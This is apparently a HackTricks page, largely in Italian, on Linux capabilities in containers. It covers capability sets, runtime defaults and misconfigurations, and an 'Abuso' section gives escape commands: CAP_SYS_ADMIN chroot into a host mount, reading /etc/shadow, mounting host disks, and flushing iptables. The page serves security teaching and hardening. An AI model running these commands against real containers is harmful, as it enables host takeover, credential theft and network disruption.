# Capacità Linux nei container

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Le capability di Linux sono una delle parti più importanti della sicurezza dei container perché rispondono a una domanda sottile ma fondamentale: **cosa significa davvero "root" all'interno di un container?** Su un sistema Linux normale, l'UID 0 storicamente implicava un insieme di privilegi molto ampio. Nei kernel moderni quel privilegio è decomposto in unità più piccole chiamate capability. Un processo può girare come root e comunque non avere molte operazioni potenti se le capability rilevanti sono state rimosse.

I container dipendono fortemente da questa distinzione. Molti carichi di lavoro vengono ancora avviati con UID 0 all'interno del container per motivi di compatibilità o semplicità. Senza il dropping delle capability, questo sarebbe troppo pericoloso. Con il dropping delle capability, un processo root containerizzato può comunque svolgere molte normali operazioni interne al container mentre gli vengono negate operazioni più sensibili del kernel. Per questo motivo una shell del container che mostra `uid=0(root)` non significa automaticamente "root dell'host" né tantomeno "ampio privilegio del kernel". Gli insiemi di capability decidono quanto valga realmente quell'identità root.

Per il riferimento completo alle Linux capability e molti esempi di abuse, vedi:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funzionamento

Le capability sono tracciate in diversi insiemi, inclusi permitted, effective, inheritable, ambient e bounding. Per molte valutazioni su container, la semantica esatta del kernel di ciascun insieme è meno immediatamente importante della domanda pratica finale: **quali operazioni privilegiate questo processo può eseguire con successo in questo momento, e quali guadagni di privilegio futuri sono ancora possibili?**

La ragione per cui questo è importante è che molte breakout techniques sono in realtà problemi di capability mascherati da problemi di container. Un carico di lavoro con `CAP_SYS_ADMIN` può accedere a una enorme quantità di funzionalità del kernel che un normale processo root in un container non dovrebbe toccare. Un carico di lavoro con `CAP_NET_ADMIN` diventa molto più pericoloso se condivide anche il host network namespace. Un carico di lavoro con `CAP_SYS_PTRACE` diventa molto più interessante se può vedere i processi dell'host tramite la condivisione dei PID con l'host. In Docker o Podman questo può apparire come `--pid=host`; in Kubernetes solitamente appare come `hostPID: true`.

In altre parole, il set di capability non può essere valutato in isolamento. Deve essere letto insieme a namespaces, seccomp e politiche MAC.

## Laboratorio

Un modo molto diretto per ispezionare le capability all'interno di un container è:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Puoi anche confrontare un container più restrittivo con uno a cui sono state aggiunte tutte le capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Per vedere l'effetto di un'aggiunta mirata, prova a rimuovere tutto e aggiungere indietro solo una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Questi piccoli esperimenti aiutano a mostrare che un runtime non si limita semplicemente a impostare un booleano chiamato "privileged". Sta plasmando la superficie effettiva di privilegi disponibile al processo.

## Capacità ad alto rischio

Although many capabilities can matter depending on the target, a few are repeatedly relevant in container escape analysis.

**`CAP_SYS_ADMIN`** è quella che i difensori dovrebbero trattare con più sospetto. Spesso è descritta come "the new root" perché sblocca una quantità enorme di funzionalità, incluse operazioni relative a mount, comportamenti sensibili ai namespace e molte code del kernel che non dovrebbero mai essere esposte ai container. Se un container ha `CAP_SYS_ADMIN`, seccomp debole e nessun forte confinamento MAC, molte vie classiche di breakout diventano molto più realistiche.

**`CAP_SYS_PTRACE`** è rilevante quando esiste visibilità dei processi, specialmente se il PID namespace è condiviso con l'host o con workload vicini interessanti. Può trasformare la visibilità in manomissione.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** sono importanti in ambienti focalizzati sulla rete. Su una rete bridge isolata possono già essere rischiose; su un namespace di rete host condiviso sono molto peggiori perché il workload potrebbe essere in grado di riconfigurare la rete dell'host, sniff, spoof o interferire con i flussi di traffico locali.

**`CAP_SYS_MODULE`** è di solito catastrofico in un ambiente con root perché caricare moduli del kernel è effettivamente controllo del kernel host. Dovrebbe quasi mai apparire in un workload container di uso generale.

## Uso del runtime

Docker, Podman, stack basati su containerd e CRI-O usano tutti controlli delle capability, ma i default e le interfacce di gestione differiscono. Docker le espone molto direttamente tramite flag come `--cap-drop` e `--cap-add`. Podman espone controlli simili e beneficia spesso dell'esecuzione rootless come ulteriore strato di sicurezza. Kubernetes espone aggiunte e rimozioni di capability tramite il `securityContext` del Pod o del container. Ambienti system-container come LXC/Incus si basano anch'essi sul controllo delle capability, ma la più ampia integrazione con l'host di quei sistemi spesso tenta gli operator a rilassare i default più aggressivamente di quanto farebbero in un ambiente app-container.

Lo stesso principio vale per tutti: una capability che è tecnicamente possibile concedere non è necessariamente qualcosa che dovrebbe essere concessa. Molti incidenti reali iniziano quando un operatore aggiunge una capability semplicemente perché un workload falliva con una configurazione più restrittiva e il team aveva bisogno di una soluzione rapida.

## Misconfigurazioni

The most obvious mistake is **`--cap-add=ALL`** in Docker/Podman-style CLIs, but it is not the only one. In practice, a more common problem is granting one or two extremely powerful capabilities, especially `CAP_SYS_ADMIN`, to "make the application work" without also understanding the namespace, seccomp, and mount implications. Another common failure mode is combining extra capabilities with host namespace sharing. In Docker or Podman this may appear as `--pid=host`, `--network=host`, or `--userns=host`; in Kubernetes the equivalent exposure usually appears through workload settings such as `hostPID: true` or `hostNetwork: true`. Each of those combinations changes what the capability can actually affect.

È anche comune vedere gli amministratori credere che poiché un workload non è completamente `--privileged`, sia comunque significativamente vincolato. A volte è vero, ma a volte la postura effettiva è già sufficientemente vicina a privileged che la distinzione smette di avere rilevanza operativa.

## Abuso

Il primo passo pratico è enumerare l'insieme effettivo delle capability e testare immediatamente le azioni specifiche per ciascuna capability che potrebbero essere rilevanti per l'escape o l'accesso alle informazioni dell'host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` è presente, prova prima l'abuso basato su mount e l'accesso al filesystem dell'host, perché questo è uno dei facilitatori di breakout più comuni:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` è presente e il container può vedere processi interessanti, verifica se la capability può essere trasformata in ispezione dei processi:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` o `CAP_NET_RAW` è presente, verifica se il workload può manipolare lo stack di rete visibile o almeno raccogliere utili informazioni di rete:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Quando un test di capability ha successo, combinalo con la situazione dei namespace. Una capability che sembra solo rischiosa in un namespace isolato può diventare immediatamente un primitivo di escape o host-recon quando il container condivide anche host PID, host network o host mounts.

### Full Example: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Se il container ha `CAP_SYS_ADMIN` e un bind mount scrivibile del filesystem dell'host come `/host`, il percorso di escape è spesso semplice:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se `chroot` riesce, i comandi vengono ora eseguiti nel contesto del filesystem root dell'host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` non è disponibile, lo stesso risultato può spesso essere ottenuto richiamando il binario attraverso l'albero montato:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Esempio completo: `CAP_SYS_ADMIN` + Accesso al dispositivo

Se un block device dall'host viene esposto, `CAP_SYS_ADMIN` può trasformarlo in accesso diretto al filesystem dell'host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Esempio completo: `CAP_NET_ADMIN` + Host Networking

Questa combinazione non produce sempre direttamente host root, ma può riconfigurare completamente lo stack di rete dell'host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Questo può abilitare denial of service, traffic interception o l'accesso a servizi che in precedenza erano filtrati.

## Controlli

Lo scopo dei capability checks non è solo quello di dumpare i valori raw, ma di capire se il processo possiede privilegi sufficienti a rendere pericolosa la sua attuale situazione di namespace e mount.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Cosa c'è di interessante qui:

- `capsh --print` è il modo più semplice per individuare capability ad alto rischio come `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` o `cap_sys_module`.
- La riga `CapEff` in `/proc/self/status` indica ciò che è effettivamente effective ora, non solo ciò che potrebbe essere disponibile in altri set.
- Un dump delle capability diventa molto più importante se il container condivide anche PID, network, o user namespaces con l'host, o ha mount scrivibili dell'host.

Dopo aver raccolto le informazioni grezze sulle capability, il passo successivo è l'interpretazione. Verificare se il processo è root, se user namespaces sono attivi, se host namespaces sono condivisi, se seccomp è in enforcing, e se AppArmor o SELinux limitano ancora il processo. Un set di capability da solo è solo una parte della storia, ma spesso è la parte che spiega perché un container breakout funziona e un altro fallisce avendo lo stesso apparente punto di partenza.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Per Kubernetes, il punto importante è che l'API non definisce un unico set di capability predefinito. Se il Pod non aggiunge o rimuove capability, il workload eredita il default del runtime per quel nodo.
{{#include ../../../../banners/hacktricks-training.md}}
